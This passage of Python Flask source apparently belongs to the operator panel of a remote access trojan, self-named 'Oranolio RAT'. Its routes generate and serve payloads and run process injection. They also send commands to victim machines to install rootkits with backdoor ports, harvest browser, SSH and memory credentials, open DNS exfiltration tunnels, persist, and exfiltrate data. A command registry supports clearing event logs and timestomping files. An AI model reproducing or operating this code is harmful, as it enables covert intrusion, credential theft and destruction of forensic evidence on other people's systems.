                'platform': result['platform'],
                'filename': result['filename'],
                'config': {
                    'bind_host': config['bind_host'],
                    'bind_port': config['bind_port'],
                    'listen_host': config['listen_host'],
                    'listen_port': config['listen_port'],
                    'enable_bind': config['enable_bind'],
                    'enable_listen': config['enable_listen'],
                    'platform': config['platform']
                },
                'download_url': '/api/download-payload'
            }
            
            # Add warning if fallback to Python script
            if 'warning' in result:
                response_data['warning'] = result['warning']
            
            return jsonify(response_data)
        else:
            log_debug(f"Payload generation failed: {result['message']}", "ERROR", "Payload")
            return jsonify({'error': result['message']}), 500
        
    except Exception as e:
        log_debug(f"Payload generation error: {str(e)}", "ERROR", "Payload")
        return jsonify({'error': f'Payload generation failed: {str(e)}'}), 500


@app.route('/api/payload/configure', methods=['POST'])
@login_required
def configure_payload():
    """Set payload configuration via API"""
    try:
        data = request.get_json(silent=True) or {}
        platform = data.get('platform', 'Windows')
        from Application.stitch_pyld_config import set_payload_config
        set_payload_config(
            bind=data.get('bind', True),
            bhost=data.get('bhost', '0.0.0.0'),
            bport=str(data.get('bport', '4040')),
            listen=data.get('listen', False),
            lhost=data.get('lhost', ''),
            lport=str(data.get('lport', '')),
            section=platform
        )
        return jsonify({'status': 'success', 'message': 'Payload configured'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Development test endpoint (remove in production!)
# Process Injection API Endpoints
@app.route('/api/inject/list-processes', methods=['GET'])
@login_required
def list_processes():
    """List all running processes with injection viability scores"""
    try:
        from injection_manager import injection_manager
        
        processes = injection_manager.enumerate_processes()
        
        # Filter based on query parameters
        show_system = request.args.get('show_system', 'false').lower() == 'true'
        show_critical = request.args.get('show_critical', 'false').lower() == 'true'
        only_injectable = request.args.get('only_injectable', 'false').lower() == 'true'
        
        filtered = []
        for proc in processes:
            if not show_system and proc['username'] in ['SYSTEM', 'root']:
                continue
            if not show_critical and proc['is_critical']:
                continue
            if only_injectable and not proc['is_injectable']:
                continue
            filtered.append(proc)
        
        return jsonify({
            'success': True,
            'count': len(filtered),
            'processes': filtered[:100]  # Limit to 100 for performance
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/inject/techniques', methods=['GET'])
@login_required
def get_injection_techniques():
    """Get available injection techniques for current platform"""
    try:
        from injection_manager import injection_manager
        
        techniques = injection_manager.get_available_techniques()
        
        return jsonify({
            'success': True,
            'platform': injection_manager.platform,
            'techniques': techniques
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/inject/execute', methods=['POST'])
@login_required
@limiter.limit("10 per hour")
def execute_injection():
    """Execute process injection"""
    try:
        from injection_manager import injection_manager
        
        data = request.json or {}
        
        # Validate required fields
        if 'pid' not in data or 'technique' not in data:
            return jsonify({'success': False, 'error': 'Missing required fields'}), 400
        
        # Execute injection
        result = injection_manager.execute_injection(data)
        
        if result['success']:
            log_debug(f"Injection successful: PID {data['pid']}, Technique: {data['technique']}", 
                     "INFO", "Injection")
            return jsonify(result)
        else:
            log_debug(f"Injection failed: {result.get('error')}", "ERROR", "Injection")
            return jsonify(result), 500
            
    except Exception as e:
        log_debug(f"Injection error: {str(e)}", "ERROR", "Injection")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/inject/status/<injection_id>', methods=['GET'])
@login_required
def get_injection_status(injection_id):
    """Get status of an injection"""
    try:
        from injection_manager import injection_manager
        
        status = injection_manager.get_injection_status(injection_id)
        
        if 'error' in status:
            return jsonify({'success': False, 'error': status['error']}), 404
        
        return jsonify({
            'success': True,
            'status': status
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/inject/terminate/<injection_id>', methods=['POST'])
@login_required
def terminate_injection(injection_id):
    """Terminate an active injection"""
    try:
        from injection_manager import injection_manager
        
        success = injection_manager.terminate_injection(injection_id)
        
        if success:
            return jsonify({'success': True, 'message': 'Injection terminated'})
        else:
            return jsonify({'success': False, 'error': 'Injection not found'}), 404
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/inject/history', methods=['GET'])
@login_required
def get_injection_history():
    """Get injection history"""
    try:
        from injection_manager import injection_manager
        
        history = injection_manager.get_injection_history()
        
        return jsonify({
            'success': True,
            'count': len(history),
            'history': history
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/test-native-payload', methods=['POST'])
@csrf.exempt
def test_native_payload():
    """Test endpoint for native payload generation - DEV ONLY"""
    if not app.debug:
        return jsonify({'error': 'Not available in production'}), 403
        
    try:
        from native_payload_builder import native_builder
        
        data = request.json or {}
        config = {
            'platform': data.get('platform', 'linux'),
            'c2_host': data.get('c2_host', 'localhost'),
            'c2_port': data.get('c2_port', 4433)
        }
        
        result = native_builder.compile_payload(config)
        
        if result['success']:
            return jsonify({
                'success': True,
                'path': str(result['path']),
                'size': result['size'],
                'hash': result['hash']
            })
        else:
            return jsonify({'success': False, 'error': result['error']}), 500
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ============= PHASE 3 INTEGRATION ENDPOINTS =============

@app.route('/api/target/<target_id>/action', methods=['POST'])
@login_required
@limiter.limit("20 per minute")
def execute_target_action(target_id):
    """Execute Phase 3 advanced actions on target"""
    try:
        metrics_collector.increment_counter('phase3_actions')
        
        data = request.json
        action = data.get('action')
        
        # Get target connection
        target_conn = active_connections.get(target_id)
        if not target_conn:
            return jsonify({'success': False, 'error': 'Target not connected'}), 404
            
        # Build command based on action
        command = {
            'id': generate_unique_id(),
            'timestamp': datetime.utcnow().isoformat(),
            'target_id': target_id
        }
        
        if action == 'rootkit':
            log_debug(f"Installing rootkit on {target_id}", "WARNING", "Phase3")
            command.update({
                'type': 'INSTALL_ROOTKIT',
                'params': {
                    'hide_pids': data.get('hide_pids', []),
                    'hide_ports': data.get('hide_ports', [4433, 31337]),
                    'hide_files': data.get('hide_files', ['stitch_*']),
                    'backdoor_port': data.get('backdoor_port', 31337)
                }
            })
            
        elif action == 'ghost':
            log_debug(f"Process ghosting on {target_id}", "INFO", "Phase3")
            command.update({
                'type': 'GHOST_PROCESS',
                'params': {
                    'payload': data.get('payload', 'self'),
                    'method': data.get('method', 'memfd'),  # memfd, transaction
                    'target_process': data.get('target_process')
                }
            })
            
        elif action == 'harvest':
            log_debug(f"Harvesting credentials on {target_id}", "INFO", "Phase3")
            command.update({
                'type': 'HARVEST_CREDS',
                'params': {
                    'targets': data.get('targets', ['browser', 'ssh', 'memory', 'env']),
                    'exfil_method': data.get('exfil_method', 'direct'),
                    'process_targets': data.get('process_targets', [])
                }
            })
            
        elif action == 'dns_tunnel':
            log_debug(f"Setting up DNS tunnel on {target_id}", "INFO", "Phase3")
            command.update({
                'type': 'SETUP_DNS_TUNNEL',
                'params': {
                    'server': data.get('server', '8.8.8.8'),
                    'domain': data.get('domain', 'data.example.com'),
                    'mode': data.get('mode', 'backup'),  # primary, backup
                    'chunk_size': data.get('chunk_size', 32)
                }
            })
            
        elif action == 'persist_all':
            log_debug(f"Installing full persistence on {target_id}", "WARNING", "Phase3")
            command.update({
                'type': 'PERSIST_FULL',
                'params': {
                    'methods': data.get('methods', ['rootkit', 'startup', 'service', 'scheduled']),
                    'backup_c2': data.get('backup_c2', True),
                    'hide_artifacts': data.get('hide_artifacts', True)
                }
            })
            
        elif action == 'exfiltrate':
            log_debug(f"Exfiltrating data from {target_id}", "INFO", "Phase3")
            command.update({
                'type': 'EXFILTRATE',
                'params': {
                    'method': data.get('method', 'direct'),
                    'target': data.get('target'),
                    'compress': data.get('compress', True),
                    'encrypt': data.get('encrypt', True),
                    'chunk_delay': data.get('chunk_delay', 100)
                }
            })
            
        else:
            return jsonify({'success': False, 'error': f'Unknown action: {action}'}), 400
            
        # Send command to target
        if send_command_to_target(target_id, command):
            pass
            # Track operation
            operation_id = command['id']
            active_operations[operation_id] = {
                'target_id': target_id,
                'action': action,
                'status': 'pending',
                'started': datetime.utcnow(),
                'command': command
            }
            
            # Emit WebSocket event
            socketio.emit('operation_started', {
                'operation_id': operation_id,
                'target_id': target_id,
                'action': action,
                'timestamp': datetime.utcnow().isoformat()
            })
            
            return jsonify({
                'success': True,
                'operation_id': operation_id,
                'message': f'Action {action} initiated'
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to send command'}), 500
            
    except Exception as e:
        log_debug(f"Phase3 action error: {str(e)}", "ERROR", "Phase3")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/target/<target_id>/info', methods=['GET'])
@login_required
def get_target_info(target_id):
    """Get detailed target information including Phase 3 status"""
    try:
        target_conn = active_connections.get(target_id)
        if not target_conn:
            return jsonify({'success': False, 'error': 'Target not found'}), 404
            
        # Get stored target info
        target_info = {
            'id': target_id,
            'status': 'online' if target_conn else 'offline',
            'last_beacon': target_conn.get('last_beacon', 'Never'),
            'ip_address': target_conn.get('ip'),
            'hostname': target_conn.get('hostname', 'Unknown'),
            'os': target_conn.get('os', 'Unknown'),
            'privileges': target_conn.get('privileges', 'user'),
            'has_rootkit': target_conn.get('has_rootkit', False),
            'has_persistence': target_conn.get('has_persistence', False),
            'credentials_found': target_conn.get('credentials_found', 0),
            'processes': []
        }
        
        # Get process list with injection scores
        if target_conn.get('processes'):
            from injection_manager import injection_manager
            processes = injection_manager.enumerate_processes()
            
            # Filter and score
            for proc in processes[:20]:  # Limit to top 20
                proc['injection_score'] = injection_manager.calculate_injection_score(proc)
                target_info['processes'].append({
                    'pid': proc['pid'],
                    'name': proc['name'],
                    'injection_score': proc['injection_score']
                })
                
        return jsonify(target_info)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/task/<task_id>/status', methods=['GET'])
@login_required
def get_task_status(task_id):
    """Get status of a Phase 3 operation"""
    try:
        operation = active_operations.get(task_id)
        
        if not operation:
            return jsonify({'success': False, 'error': 'Operation not found'}), 404
            
        # Calculate duration
        duration = (datetime.utcnow() - operation['started']).total_seconds()
        
        return jsonify({
            'success': True,
            'task_id': task_id,
            'status': operation['status'],
            'action': operation['action'],
            'target_id': operation['target_id'],
            'duration': duration,
            'result': operation.get('result'),
            'error': operation.get('error')
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/credentials', methods=['GET'])
@login_required
def get_harvested_credentials():
    """Get all harvested credentials"""
    try:
        pass
        # In production, these would be stored in database
        credentials = session.get('harvested_credentials', [])
        
        return jsonify({
            'success': True,
            'count': len(credentials),
            'credentials': credentials
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# Helper function to send commands to targets
def send_command_to_target(target_id, command):
    """Send command to connected target via WebSocket"""
    try:
        target_conn = active_connections.get(target_id)
        if not target_conn:
            return False
            
        # Encrypt command
        encrypted_command = encrypt_data(json.dumps(command))
        
        # Send via WebSocket
        socketio.emit('command', encrypted_command, room=target_conn.get('sid'))
        
        log_debug(f"Command sent to {target_id}: {command['type']}", "INFO", "Command")
        return True
        
    except Exception as e:
        log_debug(f"Failed to send command: {str(e)}", "ERROR", "Command")
        return False

# WebSocket handlers for Phase 3 operations
@socketio.on('operation_result')
def handle_operation_result(data):
    """Handle results from Phase 3 operations"""
    try:
        operation_id = data.get('operation_id')
        operation = active_operations.get(operation_id)
        
        if not operation:
            return
            
        # Update operation status
        operation['status'] = data.get('status', 'completed')
        operation['result'] = data.get('result')
        operation['error'] = data.get('error')
        
        # Special handling for different operations
        if operation['action'] == 'harvest' and data.get('credentials'):
            pass
            # Store harvested credentials
            if 'harvested_credentials' not in session:
                session['harvested_credentials'] = []
            session['harvested_credentials'].extend(data['credentials'])
            
            # Update target info
            target_id = operation['target_id']
            if target_id in active_connections:
                active_connections[target_id]['credentials_found'] = len(data['credentials'])
                
            # Broadcast credential update
            socketio.emit('credentials_harvested', {
                'target_id': target_id,
                'count': len(data['credentials']),
                'credentials': data['credentials']
            })
            
        elif operation['action'] == 'rootkit' and data.get('status') == 'installed':
            pass
            # Mark target as having rootkit
            target_id = operation['target_id']
            if target_id in active_connections:
                active_connections[target_id]['has_rootkit'] = True
                active_connections[target_id]['has_persistence'] = True
                
            socketio.emit('rootkit_installed', {
                'target_id': target_id
            })
            
        # Emit completion event
        socketio.emit('operation_completed', {
            'operation_id': operation_id,
            'status': operation['status'],
            'result': operation.get('result')
        })
        
        log_debug(f"Operation {operation_id} completed: {operation['status']}", "INFO", "Phase3")
        
    except Exception as e:
        log_debug(f"Operation result error: {str(e)}", "ERROR", "Phase3")

@app.route('/api/download-payload')
@login_required
def download_payload():
    """Download the generated payload - ENHANCED VERSION"""
    try:
        metrics_collector.increment_counter('api_requests')
        
        # Get payload info from session
        payload_path = session.get('payload_path')
        payload_filename = session.get('payload_filename', 'stitch_payload')
        payload_type = session.get('payload_type', 'script')
        payload_platform = session.get('payload_platform', 'python')
        
        # Fallback to checking for last generated payload
        if not payload_path:
            from web_payload_generator import web_payload_gen
            payload_path = web_payload_gen.get_last_payload()
            
            if payload_path:
                payload_filename = os.path.basename(payload_path)
                if payload_path.endswith('.exe'):
                    payload_type = 'executable'
                    payload_platform = 'windows'
                elif payload_path.endswith('.py'):
                    payload_type = 'script'
                    payload_platform = 'python'
                else:
                    payload_type = 'executable'
                    payload_platform = 'linux'
        
        # Final fallback to Python script
        if not payload_path or not os.path.exists(payload_path):
            payload_path = 'Configuration/st_main.py'
            payload_filename = 'stitch_payload.py'
            payload_type = 'script'
            payload_platform = 'python'
        
        if os.path.exists(payload_path):
            pass
            # Determine MIME type based on file type
            if payload_filename.endswith('.exe'):
                mimetype = 'application/x-msdownload'
            elif payload_filename.endswith('.py'):
                mimetype = 'text/x-python'
            else:
                pass
                # Generic binary for Linux/Mac executables
                mimetype = 'application/octet-stream'
            
            log_debug(f"Payload downloaded: {payload_filename} (type: {payload_type}, platform: {payload_platform})", "INFO", "Payload")
            
            # Add appropriate headers
            response = send_file(
                payload_path,
                as_attachment=True,
                download_name=payload_filename,
                mimetype=mimetype
            )
            
            # Add custom headers with payload info
            response.headers['X-Payload-Type'] = payload_type
            response.headers['X-Payload-Platform'] = payload_platform
            
            return response
        else:
            log_debug(f"Payload file not found: {payload_path}", "ERROR", "Payload")
            return jsonify({'error': 'No payload available for download'}), 404
            
    except Exception as e:
        log_debug(f"Error downloading payload: {str(e)}", "ERROR", "Payload")
        return jsonify({'error': str(e)}), 500

@app.route('/api/upload', methods=['POST'])
@login_required
@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
def upload_file():
    """Upload file to target - with validation"""
    import os
    import tempfile
    try:
        metrics_collector.increment_counter('api_requests')
        # Validate file presence
        if 'file' not in request.files:
            log_debug("Upload failed: No file in request", "ERROR", "Upload")
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        target_id = request.form.get('target_id')
        
        # Critical validation: target_id must be provided
        if not target_id or not isinstance(target_id, str) or target_id.strip() == '':
            log_debug("Upload failed: No valid target_id provided", "ERROR", "Upload")
            return jsonify({'error': 'No target connection selected. Please select an ONLINE connection first.'}), 400
        
        target_id = target_id.strip()
        
        # Validate filename
        if not file.filename or file.filename == '':
            log_debug("Upload failed: Empty filename", "ERROR", "Upload")
            return jsonify({'error': 'No file selected'}), 400
        
        # Check file size (100MB limit)
        MAX_FILE_SIZE = 100 * 1024 * 1024
        file.seek(0, os.SEEK_END)
        file_size = file.tell()
        file.seek(0)
        
        if file_size > MAX_FILE_SIZE:
            log_debug(f"Upload failed: File too large ({file_size} bytes)", "ERROR", "Upload")
            return jsonify({'error': 'File too large (max 100MB)'}), 400
        
        # Get server and validate connection exists and is ONLINE
        server = get_stitch_server()
        
        if target_id not in server.inf_sock:
            log_debug(f"Upload failed: Target {target_id} is OFFLINE or doesn't exist", "ERROR", "Upload")
            return jsonify({'error': f'Target {target_id} is OFFLINE. Please select an active connection.'}), 400
        
        # Extra validation: ensure we have a socket object
        if not server.inf_sock.get(target_id):
            log_debug(f"Upload failed: Invalid socket for target {target_id}", "ERROR", "Upload")
            return jsonify({'error': 'Invalid connection state'}), 500
        
        # Save file temporarily
        with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(file.filename)[1]) as temp_file:
            file.save(temp_file.name)
            temp_path = temp_file.name
        
        try:
            pass
            # Execute upload command
            upload_command = f"upload {temp_path}"
            output = execute_real_command(upload_command, target_id)
            
            log_debug(f"File uploaded: {file.filename} to {target_id}", "INFO", "Upload")
            
            return jsonify({
                'success': True,
                'output': f"✅ File '{file.filename}' uploaded successfully!\n\n{output}",
                'filename': file.filename
            })
        
        finally:
            pass
            # Clean up temp file
            try:
                os.unlink(temp_path)
            except Exception:
                pass
        
    except Exception as e:
        log_debug(f"Error uploading file: {str(e)}", "ERROR", "Upload")
        return jsonify({'error': str(e)}), 500

def _perform_handshake(sock, addr):
    """Simplified working handshake"""
    try:
        sock.settimeout(5)
        # Accept any connection for now
        data = sock.recv(1024)
        if data:
            logger.debug(f"Received: {data[:50]}")
            sock.send(b"OK\n")
            return True, None, "Connected"
        return False, None, "No data"
    except Exception as e:
        logger.error(f"Handshake error: {e}")
        return False, None, str(e)
        
def sync_stitch_targets():
    """
    Synchronize Stitch server connections with web app state
    Returns list of connected targets for UI with enhanced metadata
    """
    try:
        server = get_stitch_server()
        targets = []
        current_time = time.time()
        
        for target_id, sock in server.inf_sock.items():
            pass
            # Get or create connection context
            if target_id not in connection_context:
                pass
                # Detect payload type
                payload_type = native_bridge.detect_payload_type(sock)
                
                # Create enhanced context
                connection_context[target_id] = {
                    'id': target_id,
                    'ip': target_id.split(':')[0] if ':' in target_id else target_id,
                    'port': target_id.split(':')[1] if ':' in target_id else 'unknown',
                    'connected_at': current_time,
                    'last_seen': current_time,
                    'payload_type': payload_type,
                    'os': f'{payload_type.capitalize()} Payload',
                    'hostname': target_id,
                    'user': 'unknown',
                    'status': 'online',
                    'encryption': 'AES-256-CTR' if payload_type == 'native' else 'Legacy',
                    'version': 'Unknown',
                    'commands_executed': 0,
                    'last_command': None,
                    'uptime': 0
                }
                
                log_debug(f"New target detected: {target_id} ({payload_type}, encrypted)", "INFO", "Sync")
                
            # Update dynamic fields
            ctx = connection_context[target_id]
            ctx['last_seen'] = current_time
            ctx['status'] = 'online'
            ctx['uptime'] = current_time - ctx.get('connected_at', current_time)
            
            # Add to targets list with full metadata
            targets.append({
                'id': target_id,
                'ip': ctx.get('ip'),
                'port': ctx.get('port'),
                'hostname': ctx.get('hostname'),
                'os': ctx.get('os'),
                'user': ctx.get('user'),
                'payload_type': ctx.get('payload_type'),
                'encryption': ctx.get('encryption'),
                'version': ctx.get('version'),
                'connected_at': ctx.get('connected_at'),
                'last_seen': ctx.get('last_seen'),
                'uptime': ctx.get('uptime'),
                'status': 'online',
                'commands_executed': ctx.get('commands_executed', 0),
                'last_command': ctx.get('last_command')
            })
            
        # Mark offline targets
        active_ids = set(server.inf_sock.keys())
        for target_id in list(connection_context.keys()):
            if target_id not in active_ids:
                ctx = connection_context[target_id]
                if ctx.get('status') == 'online':
                    ctx['status'] = 'offline'
                    log_debug(f"Target went offline: {target_id}", "INFO", "Sync")
            
        return targets
        
    except Exception as e:
        log_debug(f"Error syncing targets: {str(e)}", "ERROR", "Sync")
        return []

def execute_command_elite(connection_id, command, *args, **kwargs):
    """Execute command using elite system with fallback to legacy"""
    executor = get_elite_executor()
    
    # Check if elite implementation exists
    available_commands = executor.get_available_commands()
    
    if command in available_commands:
        pass
        # Use elite implementation
        result = executor.execute(command, *args, **kwargs)
        
        # Add metadata
        result['source'] = 'elite'
        result['connection_id'] = connection_id
        result['timestamp'] = time.time()
        
        return result
    else:
        pass
        # Fallback to legacy Stitch implementation
        # Parse command and parameters
        if kwargs.get('parameters'):
            return execute_real_command(command, connection_id, kwargs.get('parameters'))
        else:
            return execute_real_command(command, connection_id)

def execute_real_command(command, conn_id=None, parameters=None):
    """Execute command - REAL implementation, not simulated
    
    Args:
        command: Command string to execute
        conn_id: Connection ID of target
        parameters: Optional dict of parameters for interactive commands
    """
    try:
        server = get_stitch_server()
        
        # Commands that work without a target
        if command in ['sessions', 'history', 'home', 'showkey', 'cls', 'clear']:
            if command == 'sessions':
                return get_sessions_output()
            elif command == 'history':
                return get_history_output()
            elif command == 'home':
                return "⚡ Oranolio RAT - Real-time Remote Administration\nVersion 1.0\n"
            elif command == 'showkey':
                return show_aes_keys()
            elif command in ['cls', 'clear']:
                return "✅ Command logged (screen clear is UI-specific)"
        
        # Commands that require a connection
        if not conn_id:
            return f"❌ Command '{command}' requires selecting a target connection.\n\nPlease select an ONLINE connection from the dashboard first."
        
        # Check if connection is online
        if conn_id not in server.inf_sock:
            return f"❌ Connection {conn_id} is OFFLINE.\n\nCommand execution requires an active connection."
        
        # Ensure handshake is completed so we have AES key and metadata
        if conn_id not in connection_context:
            ok, result = _perform_handshake(conn_id)
            if not ok:
                return result

        # Get the socket and execute command on target
        target_socket = server.inf_sock[conn_id]
        
        # Detect payload type (native C or Python)
        is_native = native_bridge.is_native_payload(conn_id, connection_context)
        
        start_time = time.time()
        
        if is_native:
            pass
            # Native C payload - use protocol bridge
            log_debug(f"Detected native C payload for {conn_id}", "INFO", "Protocol")
            success, output = send_command_to_native_payload(target_socket, command)
            
            if success:
                result_output = f"✅ Command executed on native payload\n\n{output}"
            else:
                result_output = f"❌ Native command failed: {output}"
                
        else:
            pass
            # Python Stitch payload - use existing stitch_lib
            log_debug(f"Detected Python Stitch payload for {conn_id}", "INFO", "Protocol")
            
            # Get AES key for this connection
            conn_aes_key = get_connection_aes_key(conn_id)
            if not conn_aes_key:
                return f"❌ No AES encryption key found for {conn_id}.\n\nUse 'addkey' to add the key first."
            
            # Execute command on target using stitch_lib with parameters
            result_output = execute_on_target(target_socket, command, conn_aes_key, conn_id, parameters)
        
        duration = time.time() - start_time
        metrics_collector.increment_counter('total_commands')
        metrics_collector.record_duration('command_duration', duration)
        
        # Update target metadata
        if conn_id in connection_context:
            connection_context[conn_id]['commands_executed'] = connection_context[conn_id].get('commands_executed', 0) + 1
            connection_context[conn_id]['last_command'] = command
            connection_context[conn_id]['last_seen'] = time.time()
        
        return result_output
        
    except Exception as e:
        metrics_collector.increment_counter('command_errors')
        return f"❌ Error executing command: {str(e)}"

# ============================================================================
# Command Definitions Registry - Metadata for Interactive Commands
# ============================================================================
COMMAND_DEFINITIONS = {
    'firewall': {
        'subcommands': {
            'open': {
                'parameters': [
                    {'name': 'port', 'type': 'number', 'prompt': 'Enter the desired port', 'required': True},
                    {'name': 'protocol', 'type': 'select', 'prompt': 'Enter desired type', 'options': ['TCP', 'UDP'], 'required': True},
                    {'name': 'direction', 'type': 'select', 'prompt': 'Enter desired direction', 'options': ['IN', 'OUT'], 'required': True, 'windows_only': True}
                ],
                'confirmation': True,
                'dangerous': False
            },
            'close': {
                'parameters': [
                    {'name': 'port', 'type': 'number', 'prompt': 'Enter the desired port', 'required': True},
                    {'name': 'protocol', 'type': 'select', 'prompt': 'Enter desired type', 'options': ['TCP', 'UDP'], 'required': True},
                    {'name': 'direction', 'type': 'select', 'prompt': 'Enter desired direction', 'options': ['in', 'out'], 'required': True, 'windows_only': True}
                ],
                'confirmation': True,
                'dangerous': False
            },
            'allow': {
                'parameters': [
                    {'name': 'program', 'type': 'text', 'prompt': 'Enter the desired program to allow', 'required': True},
                    {'name': 'rulename', 'type': 'text', 'prompt': 'Enter the name of the firewall rule', 'required': True}
                ],
                'confirmation': True,
                'dangerous': False,
                'windows_only': True
            },
            'status': {
                'parameters': [],
                'confirmation': False,
                'dangerous': False
            }
        }
    },
    'hostsfile': {
        'subcommands': {
            'update': {
                'parameters': [
                    {'name': 'hostname', 'type': 'text', 'prompt': 'Enter desired hostname to add to the hosts file', 'required': True},
                    {'name': 'ipaddress', 'type': 'text', 'prompt': 'Enter the IP address', 'required': True}
                ],
                'confirmation': True,
                'dangerous': False
            },
            'remove': {
                'parameters': [
                    {'name': 'hostname', 'type': 'text', 'prompt': 'Enter desired hostname to remove from the hosts file', 'required': True}
                ],
                'confirmation': True,
                'dangerous': False
            },
            'show': {
                'parameters': [],
                'confirmation': False,
                'dangerous': False
            }
        }
    },
    'popup': {
        'parameters': [
            {'name': 'message', 'type': 'text', 'prompt': 'Message to be displayed in popup', 'required': True}
        ],
        'confirmation': True,
        'dangerous': False
    },
    'clearev': {
        'parameters': [],
        'confirmation': True,
        'dangerous': True,
        'confirmation_message': 'Are you sure you want to clear the System, Security, and Application event logs? This is IRREVERSIBLE.'
    },
    'timestomp': {
        'subcommands': {
            'a': {
                'parameters': [
                    {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
                    {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired last accessed time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
                ],
                'confirmation': True,
                'dangerous': False
            },
            'c': {
                'parameters': [
                    {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
                    {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired creation time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
                ],
                'confirmation': True,
                'dangerous': False
            },
            'm': {
                'parameters': [
                    {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
                    {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired last modified time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
                ],
                'confirmation': True,
                'dangerous': False
            }
        }
    },
    'logintext': {
        'parameters': [
            {'name': 'text', 'type': 'text', 'prompt': 'Enter text to be displayed on login window', 'required': True}
        ],
        'confirmation': False,
        'dangerous': False,
        'macos_only': True
    }
}

def parse_command_parameters(command_string):
    """Parse command string with inline parameters like 'firewall open port=80 protocol=tcp'"""
    parts = command_string.strip().split()
    if not parts:
        return None, None, {}
    
    cmd_name = parts[0].lower()
    params = {}
    subcommand = None
    
    # Check if second part is a subcommand or parameter
    if len(parts) > 1:
        if '=' not in parts[1]:
            subcommand = parts[1].lower()
            param_start = 2
        else:
            param_start = 1
    else:
        return cmd_name, subcommand, params
    
    # Parse key=value parameters
    for part in parts[param_start:]:
        if '=' in part:
            key, value = part.split('=', 1)
            params[key.lower()] = value
    
    return cmd_name, subcommand, params

def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None):
    """Execute command on target machine using proper Stitch architecture
    
    Args:
        socket_conn: Socket connection to target
        command: Command string to execute
        aes_key: AES encryption key
        target_ip: Target IP address
        parameters: Optional dict of parameters for interactive commands
    """
    import io
    import sys
    import signal
    import builtins
    from contextlib import redirect_stdout
    
    # Greenlet-local storage for input queue (works with gevent)
    try:
        from gevent.local import local as greenlet_local
        execution_local = greenlet_local()
    except ImportError:
        pass
        # Fallback for testing/non-gevent environments
        import threading
        execution_local = threading.local()
    
    try:
        pass
        # Get target info from handshake context instead of history file
        ctx = connection_context.get(target_ip)
        if not ctx:
            return f"❌ Target {target_ip} has no active handshake context."
        target_os = ctx.get('os', 'Unknown')
        target_platform = ctx.get('platform', 'Unknown')
        target_hostname = ctx.get('hostname', target_ip)
        target_user = ctx.get('user', 'Unknown')
        target_port = ctx.get('port', '4040')
        
        # Get downloads path for this target
        cli_dwld = os.path.join(downloads_path, target_ip)
        if not os.path.exists(cli_dwld):
            os.makedirs(cli_dwld, exist_ok=True)
        
        # Set temp path based on OS
        if target_os.startswith('win'):
            cli_temp = 'C:\\Windows\\Temp\\'
        else:
            cli_temp = '/tmp/'
        
        output_header = f"""🎯 Target: {target_hostname} ({target_ip})
👤 User: {target_user}
💻 OS: {target_os}
⚡ Command: {command}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        # Parse command and parameters FIRST (before any patching)
        cmd_parts = command.strip().split(maxsplit=1)
        cmd_name = cmd_parts[0].lower() if cmd_parts else ''
        cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ''
        
        if parameters is None:
            pass
            # Try parsing inline parameters from command string
            try:
                cmd_name_parsed, subcommand_parsed, params_parsed = parse_command_parameters(command)
                parameters = params_parsed if params_parsed else None
            except Exception as e:
                return output_header + f"❌ Failed to parse command parameters: {str(e)}"
        
        # Validate and build input queue based on command definitions
        input_queue = []
        cmd_def = COMMAND_DEFINITIONS.get(cmd_name)
        
        if cmd_def and parameters:
            try:
                pass
                # Handle subcommands
                if 'subcommands' in cmd_def:
                    subcommand = cmd_args.split()[0] if cmd_args else None
                    subcommand_def = cmd_def['subcommands'].get(subcommand)
                    if subcommand_def and 'parameters' in subcommand_def:
                        pass
                        # Validate all required parameters are present
                        for param_def in subcommand_def['parameters']:
                            param_name = param_def['name']
                            if param_def.get('required') and param_name not in parameters:
                                return output_header + f"❌ Missing required parameter: {param_name}\n\nCommand: {cmd_name} {subcommand}"
                            if param_name in parameters:
                                value = parameters[param_name]
                                # Basic validation
                                if param_def['type'] == 'number':
                                    try:
                                        int_val = int(value)
                                        if param_name == 'port' and not (1 <= int_val <= 65535):
                                            return output_header + f"❌ Invalid port number: {value} (must be 1-65535)"
                                        input_queue.append(str(int_val))
                                    except ValueError:
                                        return output_header + f"❌ Invalid number for {param_name}: {value}"
                                else:
                                    input_queue.append(str(value))
                        # Add confirmation if required
                        if subcommand_def.get('confirmation'):
                            input_queue.append('y')
                elif 'parameters' in cmd_def:
                    pass
                    # Validate all required parameters
                    for param_def in cmd_def['parameters']:
                        param_name = param_def['name']
                        if param_def.get('required') and param_name not in parameters:
                            return output_header + f"❌ Missing required parameter: {param_name}\n\nCommand: {cmd_name}"
                        if param_name in parameters:
                            input_queue.append(str(parameters[param_name]))
                    # Add confirmation if required
                    if cmd_def.get('confirmation'):
